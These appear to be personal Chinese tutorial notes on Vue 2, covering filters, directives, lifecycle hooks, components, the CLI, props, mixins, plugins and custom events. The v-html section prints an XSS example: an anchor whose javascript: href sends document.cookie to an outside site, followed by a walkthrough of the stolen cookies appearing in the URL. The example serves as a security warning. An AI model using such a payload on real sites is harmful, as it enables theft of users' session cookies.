<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | strSlice }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            },            strSlice(value){                return value.slice(0,4)            }        }        })    </script></body>
~~~

* 写在vue实例里的过滤器（局部过滤器）只能供该实例使用，其他vue实例（或组件）不能使用
* 局部过滤器，写在配置项 filters 里
* 全局过滤器，写在Vue.filter('方法名'，回调函数),传参方式一样

~~~html
<body>    <div id="app">        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | gSlice(5) }}</h1>    </div>    <div id="app2">        <h2>截取{{ message | gSlice(5) }}</h2>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        Vue.filter('gSlice',function(value,n){            return value.slice(0,n)        })        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            },            strSlice(value){                return value.slice(0,4)            }        }        })        new Vue({           el: '#app2',           data () {              return {                  message: "123456789"              }           }        })    </script></body>
~~~

* 注意，v-model 不能绑定过滤器
* 可以用在插值语法里，v-bind 属性里

## 十五 内置指令

* v-on、v-bind，v-model

### v-text

* v-text 能替换掉节点里的内容
* v-text会将所有字符串正常当作字符串显示，不会解析标签文本

~~~html
<body>        <div id="app">        <h1>{{ msg }}</h1>        <h1 v-text='msg'>我这几个字会被替换掉</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: 'hello vvvvv'              }           }        })    </script></body>
~~~

### v-html

* 它与v-text的区别就是他能解析标签文本
* 这里页面会显示出a连接

~~~html
<body>        <div id="app">        <h1>{{ msg }}</h1>        <h1 v-html='msg'>我这几个字会被替换掉</h1>            </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: 'hello  <a href="http://www.baidu.com">baidu</a>'              }           }        })    </script></body>
~~~

* 安全性问题
  * 对于这种能将字符串解析为标签的方式来说，存在着很大的问题 
  * xss攻击：冒充用户之手，就是利用用户的cookie来盗取信息

例如：

~~~html
<body>        <div id="app">        <h1 v-html='msg'></h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这是一段诱惑性文字，你看到一定会点我的</a>'              }           }        })    </script></body>
~~~

这段字符串将会被解析为a标签显示在页面上，如果用户点击了该链接，将跳转到该网站并附带上当前网站的cookie信息

1. 模拟一下，先打开浏览器的cookie工具然后写一些cookie在上面

2. 刷新是不会去除cookie的，点击该链接
3. 跳转到百度网站，发现此时的地址栏

~~~shell
https://www.baidu.com/?id=root;%20pwd=111111
~~~

4. 刚刚那个网站的cookie（刚刚自己写上去的）被作为参数传给了百度网站
5. cookie是很重要的，包含了一些用户的敏感信息
6. 所以不建议这种能直接将字符串解析为标签的方式
7. 虽然，可以在cookie信息后面将 httpOnly勾选上(这样会禁止操作cookie，只有http协议能够去修改和携带)，如果服务器不完善，没有加httpOnly给用户的敏感信息，会出现漏洞

### v-cloak

* 这个属性会在vue文件加载完，vue实例接管了容器的时候，删除掉该属性
* 为了用户在网速慢时候页面显示出未经解析的模板
* 配合css属性选择器使用

~~~html
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak]{
            display:'none'
        }
    </style>
</head>
<body>
    
    <div id="app">
        <h1 v-cloak>{{ msg }}</h1>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  msg: 'hello'
              }
           }
        })
    </script>
</body>
~~~

### v-once

* 只会加载一次值
* 第一个a 在初次动态渲染后，就视为静态内容
* 以后数据的改变，不会引起v-once所在标签里的数据的改变

~~~html
<body>        <div id="app">        <h1 v-once>a的初始值是：{{ a }}</h1>        <h2>a: {{ a }}</h2>        <button @click='a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  a: 1              }           }        })    </script></body>
~~~

### v-pre

* 会让vue跳过对它的解析
* 写成什么样，页面就显示什么样

~~~html
<body>        <div id="app">        <h1 v-pre>hello</h1>        <h2 v-pre>a: {{ a }}</h2>        <button v-pre @click='a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  a: 1              }           }        })    </script></body>
~~~

* 可以利用它跳过哪些没有用指令用法，插值语法的节点，加快编译，提高效率

## 十六 自定义指令

~~~html
<body>    <div id="app">        <h1>a的值为：<span v-text="a"></span></h1>        <h2>a的五倍值为：<span v-five="a"></span></h1>        <button @click="a++">a++</button>    </div>    <script>        new Vue({           el: '#app',           data () {              return {                  a:1              }           },           directives:{            //    第一种写法，写为对象形式，可以处理一些细节上的问题            //    five:{            //        k:v,            //        k:v,            //        ...            //    }                //第二种写法，函数形式，不能处理一些细节问题                five(element,binding){                    console.log(element instanceof HTMLElement);//true                    console.log(binding.value);//就是 v-five后的值                    element.innerText = binding.value * 5                }           }        })    </script></body>
~~~

* 在vue实例里加上配置项 directives
* 用的时候加上  v-  前缀，定义指令时候不加该前缀
* 两种写法
  * 对象形式，麻烦，但是细节
  * 函数形式，简单，但是不能细节处理
* 函数形式接收的第一个参数为DOM元素，第二个为对应的绑定关系
* 指令所在的模板重新解析时候，指令函数会被重新调用

**对象形式**

* 可以处理细节

**例子：让元素默认获取焦点**

~~~javascript
directives:{               fbind(e,b){                   e.value = b.value                   e.focus()               }           }
~~~

* 这段代码在页面刷新之后，并不会获取焦点，当你点击按钮时候才可以，但其实页面刷新后，该函数执行过一次了
* 指令被调用的时机（对于函数形式）
  * 指令和元素成功绑定时候
  * 指令所在的模板重新解析时候
* 重点在指令和元素成功绑定时候，是在内存里绑定的，input并没有跑到页面的，因为input被vue管理时候，经过一些步骤后才渲染在页面上的

**使用对象形式**

~~~javascript
directives:{			fbind:{         bind(){            console.log('bind');         },         inserted(){            console.log('insert');         },         update(){            console.log('update');         }     }}
~~~

* 里面有三个函数（一般称为钩子）
  * bind()  : 建立绑定关系时候
  * inserted()： 指令所在元素被插入页面时候
  * update()：指令所在模板被重新解析时候
  * 这三个函数接收到的参数与函数指令形式一样  （element，binding）

~~~html
<body>    <div id="app">        <h1>a的值为：<span v-text="a"></span></h1>        <hr>        <input type="text" v-fbind:value="a">        <button @click="a++">a++</button>    </div>    <script>        new Vue({           el: '#app',           data () {              return {                  a:1              }           },           directives:{                fbind:{                    bind(){                        console.log('bind');                    },                    inserted(e,b){                        console.log('insert');                        e.value = b.value                        e.focus()                    },                    update(e,b){                        console.log('update');                        e.value = b.value * 5                        e.focus()                    }                }           }        })    </script></body>
~~~

**注意点**

* 指令不要使用驼峰命名，会被编译成小写，并且报错找不到指令

* 建议使用 - 链接多个单词,注意这样不能写简写了，得加引号，后面function可简写

  * ~~~javascript
    "f-number":function(){}
    ~~~

* 三个钩子里的this都是window，（尽管没有用箭头函数）

* 以上例子都是写在vue实例里的，是局部指令，只能供该实例使用

* 所以要定义全局指令的方法和过滤器一样  Vue.directive("名字","配置对象|或函数")

## 十七 生命周期

图示：官网：[https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA](https://cn.vuejs.org/v2/guide/instance.html#生命周期图示)

**生命周期函数**

* this都指向vue实例
* beforeCreate(): 在创建数据监测和数据代理开始之前
* created():在创建数据监测和数据代理之后
* beforeMount(): vue完成模板解析后生成虚拟DOM但是还没有挂载到真实页面
* mounted(）：vue完成模板解析后将虚拟DOM挂载到真实页面后调用
* beforeUpdate()：当有数据发生改变时候
* updated(): 数据和页面更新后
* beforeDestroy():
* destroyed():

### beforeCreate(): 

* 此时无法通过vm访问到data中的数据，methods中的方法，因为还没有开始数据代理

### created():

* 此时可以通过vm访问到data中的数据，methods中的方法

### beforeMount():

* 页面呈现的是未经vue编译的DOM结构
* 所有对DOM的操作，**最终**都不奏效

### mounted():

* 页面呈现的是经vue编译的DOM结构
* 所有对DOM的操作会奏效(但不建议这么干)
* 至此初始化过程结束，一般在这里进行如下操作
  * 开启定时器
  * 发送网络请求
  * 订阅消息
  * 绑定自身事件等初始操作

### beforeUpdate():

* 此时，数据是新的，但页面任然是旧的
* 调用此函数后，将会根据新的数据生成新的虚拟DOM并与旧虚拟DOM对比然后完成页面更新（Model  到 view 的更新）

### updated(): 

* 此时：数据和页面都是新的，页面和数据保持同步

### beforeDestroy():

* 如果想要经历一下来个周期，就必须调用 vm.$destroy()
* 此时：vm中所有的 data，methods，指令等等，都处于可用状态，马上要执行销毁过程
* 在此阶段修改了数据不会引起页面变化，数据确实变化了
* 一般在此阶段执行：
  * 关闭定时器，取消订阅消息，解绑自定义事件等结束操作

* 注意调用了vm.$destroy()后：
  * 完全销毁一个实例，清理它与其它实例的连接，解绑它的全部指令和事件监听器（是自定义事件、不是给按钮写的点击事件等，它任然有用）
  * 触发 beforeDestroy() 和 destroyed() 的钩子
  * 官网描述：https://cn.vuejs.org/v2/api/#vm-destroy

### destroyed():

* 此时，已经移除了所有子组件和自定义事件
* 一般用不到这个钩子

* 已经凉了

~~~html
<body>
    <div id="app">
        <h1>n 的值为： {{ n }}</h1>
        <button @click="n++">n++</button>
        <button @click="sayBye">销毁vue实例</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false

        new Vue({
           el: '#app',
           data () {
              return {
                 n: 1
              }
           },
           methods: {
               sayBye(){
                   console.log('byebye');
                    this.$destroy()
               }
           },
           beforeCreate() {
               console.log('beforeCreate')
               console.log(this);
               debugger;
           },
           created() {
               console.log('created')
               console.log(this);
               debugger;
           },
           beforeMount() {
               console.log('beforeMount')
               console.log(this);
               debugger;
           },
           mounted() {
              console.log('mounted')
               console.log(this);
               debugger;
           },
           beforeUpdate() {
               console.log('beforeUpdate');
               console.log(this);
               debugger;
           },
           updated() {
               console.log('updated');
               console.log(this);
               debugger;
           },
           beforeDestroy() {
              console.log('beforeDestroy')
               console.log(this);
               debugger;
           },
           destroyed() {
               console.log('destroyed')
               console.log(this);
               debugger;
           },
        })
    </script>
</body>
~~~

# 第二章：Vue组件化编程

* 实现应用中局部功能代码和资源的集合
* 一个组件包括实现该部分的html结构和对应的css样式以及js交互

* 许多组件组合在一起组成一个vm应用
* 实现了结构代码样式的高度复用，简化了项目编码，提高运行效率
* 更方便代码复用
* “ **封装** ”

## 非单文件组件

* 一个文件中包含有n个组件

例子，有这么一个结构

~~~html
<body>    <div id="app">        <h2>学校名字：{{ schoolName }}</h2>        <h2>学校地址：{{ schoolAddress }}</h2>        <br><hr><br>        <h2>学生名字：{{ studentName }}</h2>        <h2>学生地址：{{ studentAddress }}</h2>    </div>    <script>        Vue.config.productionTip = false        new Vue({           el: '#app',           data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',                  studentName: 'shishi',                  studentAddress: 'runjie house'              }           }        })    </script></body>
~~~

* 现在将学校和学生单独拆出来

* 使用组件分为三步

  * 创建组件

  ~~~javascript
  //创建一个school组件        const school = Vue.extend({            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })
  ~~~

  

  * 注册组件

  ~~~javascript
  			new Vue({           el: '#app',           //局部注册组件           components: {               school_component: school,               student_component: student           }        })
  ~~~

  

  * 使用组件

要将html模板从html结构中拆出来放到组件中template：配置项上

~~~javascript
 //创建一个school组件        const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                    </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            template: `                <div>                    <h2>学生名字：{{ studentName }}</h2>                    <h2>学生地址：{{ studentAddress }}</h2>                    </div>            `,            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })
~~~

然后将组件标签加到html结构中（和html标签一样的写法）

并且标签在解析时候，会变成大写开头的驼峰命名

~~~html
<div id="app">        <!-- 使用组件标签 -->        <school_component></school_component>        <br><hr><br>        <student_component></school_component>    </div>
~~~

完整文件

~~~html
<body>    <div id="app">        <!-- 使用组件标签 -->        <school_component></school_component>        <br><hr><br>        <student_component></school_component>    </div>    <script>        Vue.config.productionTip = false        //创建一个school组件        const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                    </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            template: `                <div>                    <h2>学生名字：{{ studentName }}</h2>                    <h2>学生地址：{{ studentAddress }}</h2>                    </div>            `,            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })        new Vue({           el: '#app',           //局部注册组件           components: {               school_component: school,               student_component: student           }        })    </script></body>
~~~



* 组件定义时，不写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定怎么使用
* 并且data得写成函数形式，并将数据封装成对象作为返回值，（因为对象形式是一个引用关系，会引起组件间的数据互相更改）
* 组件标签在解析时候，会变成大写开头的驼峰命名
  * 但是如果注册时候，写成大写驼峰 比如  MyDog 会报错，这得在脚手架时候这样写，并且是官方推荐
* 所以组件名的写法：
  * 一个单词组成：
    * dog
    * Dog
  * 多个单词：
    * my-dog
    * MyDog（得在脚手架环境）
* 组件名要回避html标签名字
* 标签名如果使用自闭和的形式，不适用脚手架环境会导致后续组件不能渲染
* 我们可以决定在开发者工具中呈现的标签名字，不改代码注册时候和应用时候

~~~javascript
const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },             name: 'ggggg'        })//开发者工具中可以看到<Ggggg>
~~~

* 我们创建组件时候可以简写

* ~~~javascript
  const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },        })
  ~~~

* 写为

* ~~~html
  const hello ={            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },        }
  ~~~

* Vue.extend（）方法会在注册组件时候，vue帮我们调用

**组件全局注册（用的少）**Vue.component（’名字‘，组件对象）

~~~javascript
const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            }        })        Vue.component('hello', hello)
~~~

* 这样任何一个vm都能使用该Hello标签组件

### 组件嵌套

* 将子组件嵌套到父组件里，哪里注册就在哪里的template里写标签

~~~html
<body>
    <div id="app">
        <school></school>
    </div>

    <script>
        Vue.config.productionTip = false

       
        //创建student组件
        const student = Vue.extend({
            template: `
                <div>
                    <h2>学生名字：{{ studentName }}</h2>
                    <h2>学生地址：{{ studentAddress }}</h2>    
                </div>
            `,
            data () {
              return {
                studentName: 'shishi',
                studentAddress: 'runjie house'
              }
           }
        })

         //创建一个school组件
         const school = Vue.extend({
            template: `
                <div>
                    <h2>学校名字：{{ schoolName }}</h2>
                     <h2>学校地址：{{ schoolAddress }}</h2>  
                     <student></student>  
                </div>
            `,
            data () {
              return {
                  schoolName: 'cup',
                  schoolAddress:'beijin cp',
              }
           },
           //局部注册
           components: {
               student
           }
        })

        new Vue({
           el: '#app',
           //局部注册组件
           components: {
               school,
               student
           }
        })
    </script>
</body>
~~~

### VueComponent

* Vue.extend()生成的组件是一个构造函数
* Vue在解析组件标签时候，就会帮助我们创建组件的实例对象，即Vue帮我们new了一个组件实例
* 每次调用Vue.extend()的时候，返回的都是一个全新的VueComponent

Vue.extend的源码部分

~~~javascript
Vue.extend = function (extendOptions) {
      /*......*/

      var Sub = function VueComponent (options) {
        this._init(options);
      };
      /*.......*/
      return Sub
    };
~~~

* 返回的Sub是一个构造函数
* 关于this的指向
  * 组件配置中：
    * data函数、methods中的函数、watch中的函数、computed中的函数，他们的this都是  VueComponent实例对象
  * new Vue（options）配置中：
    * data函数、methods中的函数、watch中的函数、computed中的函数，他们的this都是  Vue实例对象

### Vue实例与组件实例

* 在控制台打印出来vue实例和组件实例发现，几乎可以划等号，但是并不是等号
  * vm 可以写el配置，组件不能
  * 而且组件的data必须写成函数形式
* 官网描述：https://cn.vuejs.org/v2/guide/components.html

### 一个重要的内置关系：

==Vue 让VueComponent的原型对象的隐式原型属性指向了Vue的原型对象==（本来是指向Object的原型对象的）

`VueComponent.prototype.__proto__ === Vue.prototype`

这样处理可以让组件实例对象可以访问到Vue原型上的属性、方法

~~~html
<script>        Vue.config.productionTip = false         //创建一个school组件         const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                  </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           },        })        new Vue({           el: '#app',           data () {              return {                  msg: 'hello'              }           }        })        console.log(school.prototype.__proto__ === Vue.prototype);//true    </script>
~~~



## 单文件组件

* 一个文件中只包含一个组件，**后缀名为  .vue**

### 创建一个组件文件（.vue）

* 它的文件命名遵循组件命名要求

.vue文件的基本结构（实现应用中局部功能代码和资源的集合）

~~~vue
<template>  </template><script>export default {}</script><style></style>
~~~

* template里必须要有一个div包裹其他结构、template不参与结构渲染

* script里必须暴露出去，三种暴露方式，一般使用默认暴露，再省略去Vue.extend，直接在里面写配置对象，而且最好写上name属性，定义好自己的组件标签名
* style 里写对应结构的样式

* 有一个组件 App.vue 必须编写
* 需要在index.js（或main  、 app.js）中创建一个vm实例
* 并且需要容器，也就是index.html文件作为入口文件

完整流程

创建我们的组件 school.vue文件

~~~vue
<template>    <div>        <h2>学校名字：{{ schoolName }}</h2>        <h2>学校地址：{{ schoolAddress }}</h2>    </div></template><script>export default {  data() {    return {      schoolName: "cup",      schoolAddress: "beijin cp",    }  },}</script><style></style>
~~~

创建App.vue文件

在交互里引入 刚刚的子组件school.vue并注册组件

~~~vue
<template>  <div>      <School></school>  </div></template><script>//引入组件import School from './school.vue'export default {    name: 'App',    components: {School}}</script><style></style>
~~~

创建main.js文件

引入 App.vue文件，并注册组件，并创建Vue实例，为了 index.html中的容器看起来简洁，直接在这里写模板

~~~js
import App from './App.vue'new Vue({   el: '#root',   template: `    <App></App>   `,   components:{App}})
~~~

创建index.html文件

* 注意引入vue文件，注意引入main.js，并且尽量写在容器下面

~~~html
<!DOCTYPE html><html lang="zh"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title></head><body>    <div id="root">    </div>    <script src="../../node_modules/vue/dist/vue.js"></script>    <script src="./main.js"></script></body></html>
~~~

* 到此就是一个完整的组件化开发，但是这里浏览器是不能运行成功的，因为浏览器不能直接解析es6的js语法（import语法）
* 所以要借助脚手架

# 第三章： 使用脚手架

* Vue 脚手架是Vue官方提供的标准化开发工具（开发平台）

* 官网：https://cli.vuejs.org/zh/

* 安装：

  * ```bash
    npm install -g @vue/cli
    ```

* 创建项目（先切换到要创建项目的目录）（此命令从vue-cli3版本开始,没有此命令要升级脚手架版本）

  * ```bash
    vue create my-project
    ```

* 运行项目

  * ~~~bash
    npm run serve
    ~~~

* 当多有功能（即项目）完成后，执行打包，将文件构建在一起，以便拿文件给后端

  * ~~~bash
    npm run build
    ~~~

* 检查eslint语法（一般用不到）

  * ~~~bash
    npm run lint
    ~~~

* 更新脚手架版本（请在创建项目前）

  * ```bash
    npm update -g @vue/cli
    ```

index.html文件中的noscript标签标识，浏览器不支持js时候内容就会被渲染

## render函数

* 使用vue-cli 4+版本创建的项目的main.js中将App放入到容器的地方使用了这个函数

* 如果我们使用template模板方式的话，控制台会报错：You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build

* 因为它给我们引入的vue（运行时版本 vue.runtime.esm.js）没有带有模板解析器

  * 除非我们自己引入完整版的vue

    * ~~~js
      // import Vue from 'vue'
      import Vue from '../../../node_modules/vue/dist/vue'
      ~~~

  * 使用render函数去渲染模板

    * ~~~js
      new Vue({
        render: h => h(App),
      }).$mount('#app')
      
      // new Vue({
      //    el: '#app',
      //    template: `<App></App>`,
      //    components: {App}
      // })
      ~~~

render()函数

~~~js
new Vue({
  // render: h => h(App),
  render(createElement){
    console.log(typeof createElement);//function
    return createElement('h1','hello')
  }
}).$mount('#app')
~~~

完整写法

~~~js
 render(createElement){    console.log(typeof createElement);//function    return createElement('h1','hello')  }
~~~

因为用不到this，所以使用箭头函数后

~~~js
render: createElement => createElement('h1','hello')
~~~

再精简变量名和使用组件

~~~js
render: h => h(App)
~~~

为什么vue版本被拆成了几个精简版vue（有vue核心，没有模板解析器部分）

* 因为模板解析器代码占了源码的 1/3，交给webpack打包时候，生成的文件中不应该出现模板解析器代码（多余）

## 关于脚手架的默认配置

* src文件夹必须有，里面必须有main.js入口文件

* 不同于老版本脚手架，新版本脚手架将webpack配置文件隐藏了

  * 需要执行vue inspect > output.js,它会将所有脚手架默认配置整理输出到一个js文件中给我们看

* 但是这个js文件只是给你看的，你在里面改了配置也没有用

* 关于脚手架默认配置不能改的地方

  * public文件夹
  * src文件夹
  * main.js文件

* 如果我们想改默认配置的话，官网https://cli.vuejs.org/zh/config/#vue-config-js配置参考项左边目录出现的都是允许改的，没有出现的话就是不能改的

  * 假如修改src文件夹和main.js文件

  * 我们查看官网说明

    * 需要自己编写vue.config.js文件（严格遵照 JSON 的格式），放在与package.json同级目录下

    * 点击官网pages说明

    * ~~~js
      module.exports = {
        pages: {
          index: {
            // page 的入口
            entry: 'src/index/main.js',
            // 模板来源
            template: 'public/index.html',
            // 在 dist/index.html 的输出
            filename: 'index.html',
            // 当使用 title 选项时，
            // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
            title: 'Index Page',
            // 在这个页面中包含的块，默认情况下会包含
            // 提取出来的通用 chunk 和 vendor chunk。
            chunks: ['chunk-vendors', 'chunk-common', 'index']
          },
          // 当使用只有入口的字符串格式时，
          // 模板会被推导为 `public/subpage.html`
          // 并且如果找不到的话，就回退到 `public/index.html`。
          // 输出文件名会被推导为 `subpage.html`。
          subpage: 'src/subpage/main.js'
        }
      }
      ~~~

    * 可以看到它遵循commonjs暴露，它会优先遵循你的配置去整合默认配置

    * 取消各种lint语法检查 lintOnSave:false，注意层级在配置项第一层，写多个配置时候注意各个配置层级

    ~~~js
    module.exports = {
      pages: {
        index: {
          // page 的入口
          entry: 'src/index/main.js',
        },
      },
      lintOnSave:false
    }
    ~~~

    

## ref属性

* 用来给元素或子组件注册引用信息（id的替代品）
* 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象

~~~vue
<template>
  <div>
    <h1 ref="msgTitle">{{msg}}</h1>
    <button @click="show">点击显示</button>
    <School/>
  </div>
</template>

<script>
import School from './components/School.vue'
export default {
  name: 'App',
  components:{School},
  data() {
    return {
      msg: 'hello ref'
    }
  },
  methods: {
    show(){
     console.log(this.$refs.msgTitle)
    }
  },
}
</script>

<style>

</style>
~~~

## 配置项props

* 让组件接收外部传过来的数据（父组件给子组件传递）

* 父组件这样传递，将数据写在子组件的标签属性中

* ~~~vue
  <template>
    <div>
      <Student name='luffy' gender='男' :age=21 />
      <hr>
      <Student name='sanji' gender='男' :age=22 />
      <hr>
      <Student name='namei' gender='女'  />
      <hr>
    </div>
  </template>
  
  <script>
  import Student from './components/Student.vue'
  export default {
    name: 'App',
    components:{Student},
  }
  </script>
  
  <style>
  
  </style>
  ~~~

* 注意 v-bind 即 ：age表示强制绑定传递的是Number

* 子组件接收方式有三种

* 第一种，比较简洁，就声明接收了那几个数据

* 第二种，能够限制接收的数据是什么类型的，不对则报错传递数据类型错误

* 第三种，限制类型+限制必要性+指定默认值

* ~~~vue
  <script>
  export default {
      name:'School',
    //第一种
      // props:['name','gender','age'],
    //第二种
      // props:{
      //     name:String,
      //     age:Number,
      //     gender:String
      // },
    //第三种
      props: {
         name:{
             type:String,//name类型为字符串
             required:true//name数据必须传
         },
         gender:{
             type:String,
             required:true
         },
         age:{
             type:Number,
             default:99//默认值为99，不传该参数就默认使用
         }
      },
      data() {
          return {
              msg: 'hello',
          }
      },
  }
  </script>
  ~~~

* props是只读的，Vue会检测是否修改了props里的数据，能改掉，但是会提示警告。如果想要修改，应该备份一份在data中修改而不是直接改props里的数据

## mixin混入

* 可以把多个组件公用的配置提取到一个混入对象中

* 第一步要定义混合，新建mixin.js（名字随便）文件，将配置提取出来到其中，并向外暴露

* ~~~js
  export const mixin = {
      methods: {
          showName(){
              alert(this.name)
          }
      },
  }
  ~~~

* 局部使用，则在想要使用的组件中加配置项mixins：[mixin],必须写成数组形式

* 全局混合，则在mian.js中引入

* ~~~js
  import Vue from 'vue'
  import App from './App.vue'
  //引入混合
  import {mixin} from './mixin'
  
  Vue.config.productionTip = false
  
  //全局引入混合
  Vue.mixin(mixin)
  
  new Vue({
    render: h => h(App)
  }).$mount('#app')
  ~~~

* 注意，如果于组件里自己的配置项有同名冲突，比如data中的数据和methods中的数据和方法冲突，以组件自身为主要，但是钩子函数里的代码会被整合在一起都执行，并且先执行mixin中的代码，注意全局混合会让每一个组件都有该混合中的配置

## 插件

* 能够增强Vue

* 本质：包含install方法的一个对象

* install(Vue)方法中的第一个参数是Vue，即vm的缔造者Vue构造函数，以后的参数是使用插件时候传递进来的数据

* 新建一个插件文件plugin.js，

* ~~~js
  export default{
      install(Vue,rest){
          console.log(Vue,rest);
      }
  }
  ~~~

* 因为拿到了Vue，所以可以将 以前写过的过滤器，全局指令，混合，向Vue原型上添加方法和属性都可以写在里面来表示这个插件的功能

* 使用插件一定要在vm创建之前

* ~~~js
  import Vue from 'vue'
  import App from './App.vue'
  //引入插件
  import plugins from './plugins'
  
  Vue.config.productionTip = false
  //使用插件
  Vue.use(plugins,1)
  
  new Vue({
    render: h => h(App)
  }).$mount('#app')
  ~~~

  

##  scoped样式

* 让style里的样式局部生效，防止于其他组件冲突
* 写法： `<style scoped>`
* 它会给这个 组件的类选择器配合属性选择器来实现区别其他组件的同类名样式，它会随机生成属性名

* 同样如果要使用其他css的预处理语言，在这里使用lang属性指定
* 比如`<style lang='less'>`表示使用less语言来编写css
  * 注意：脚手架默认是没有less支持的，需要npm i less-loader，脚手架会提示你安装这个
  * 并且可能会存在兼容问题，建议降低less-loader的版本去兼容webpack版本

## 组件自定义事件

假设我们要子组件给父组件传递数据的话，我们需要让父组件给子组件传递一个函数类型的props数据，然后让子组件调用这个函数来实现从子组件向父组件的逆向传递数据，比如

父组件：

~~~vue
<template>
  <div class="outer">
    <h1>{{ msg }}</h1>
    <School :getSchoolName="getSchoolName" />
    <hr>
    <Student/>
  </div>
</template>

<script>
import School from './components/School.vue'
import Student from './components/Student.vue'
export default {
  name: 'App',
  components:{Student, School},
  data() {
    return {
      msg: 'hello !'
    }
  },
  methods: {
    getSchoolName(name){
      console.log('外部收到了schoolname',name);
    }
  },
}
</script>

<style>
.outer{
  background:rgb(125, 125, 190);
  padding: 20px;
}
</style>
~~~

子组件

~~~vue
<template>
  <div class="demo">
      <h2>学校名称：{{name}}</h2>
      <button @click="sendSchoolName">把名字给外部</button>
      <h2>学校地址：{{address}}</h2>
  </div>
</template>

<script>
export default {
    name:'School',
    props: ['getSchoolName'],
    data() {
        return {
            name: 'cup',
            address: 'beijing cp'
        }
    },
    methods: {
        sendSchoolName(){
            this.getSchoolName(this.name)
        }
    },
}
</script>

<style scoped>
.demo{
    background: rgb(133, 27, 124);
    padding: 20px;
}
</style>
~~~

那么我们使用组件自定义事件来实现上面这个功能

假如我们现在给另一个子组件绑定事件

* 给子组件绑定一个事件，newEvent是我们自定义的（并且它是绑定给Student这个组件实例的），show是方法写在methods配置里

* ~~~html
  <Student v-on:newEvent="show" />
  ~~~

* ~~~js
  show(str){
        console.log('自定义事件触发了');
      }
  ~~~

* 然后去被绑定的这个子组件里

* 因为自定义事件是绑定在组件实例上的，所以子组件是拿的到

* 通过this.$emit（“自定义事件”，‘参数’）方法来触发

* ~~~vue
  <template>
    <div class="demo">
        <h2>学生名称：{{name}}</h2>
        <h2>学生性别：{{gender}}</h2>
        <button @click="sendName">点击触发自己的自定义事件</button>
    </div>
  </template>
  
  <script>
  export default {
      name:'School',
      data() {
          return {
              name: 'shishi',
              gender: '男'
          }
      },
      methods: {
          sendName(){
              this.$emit('newEvent',this.name)
          }
      },
  }
  </script>
  
  <style scoped>
  .demo{
      background: #bfa;
      padding: 20px;
  }
  </style>
  ~~~

* 其实上面这两种方法，无论哪种，都是要先在父组件里写好回调函数

* 但是自定义事件是没有接收props数据的

* 注意： v-on： 的简写就是 @ 符号

* 第二种自定义事件绑定的方式，这种方式更灵活

* 先使用ref拿到组件实例对象

* this.$refs.student.$on('newEvent',this.show) 表示当newEvent事件被处罚时候，执行show回调，注意这里不要加括号

* ~~~vue
  <template>
    <div class="outer">
      <h1>{{ msg }}</h1>
      <School :getSchoolName="getSchoolName" />
      <hr>
      <!-- <Student v-on:newEvent="show" /> -->
      <Student ref="student" />
